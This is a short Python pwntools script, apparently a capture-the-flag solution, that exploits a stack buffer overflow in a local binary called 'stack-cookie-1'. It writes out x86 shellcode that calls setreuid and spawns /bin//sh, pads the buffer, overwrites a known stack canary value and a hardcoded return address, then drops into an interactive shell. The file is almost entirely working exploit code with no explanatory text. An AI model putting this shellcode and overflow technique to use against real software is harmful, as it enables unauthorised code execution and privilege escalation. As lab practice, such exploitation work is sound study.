#!/usr/bin/env python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']
p = process('./stack-cookie-1')
#gdb.attach(p)

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

#buf = "A" * 0x84 + p32(0xfaceb00c) + "AAAAAAAAAAAAAAAAAAAAAA"

#p.sendline(buf)
#p.wait()

#c = Core('./core')
#bufAddr = c.stack.find(buf)
#print(hex(bufAddr))

buf = shellcode + "A" * (0x84 - len(shellcode)) + p32(0xfaceb00c) + "AAAA" +  p32(0xffffd450)

p.sendline(buf)

print(p.recv())

p.interactive()
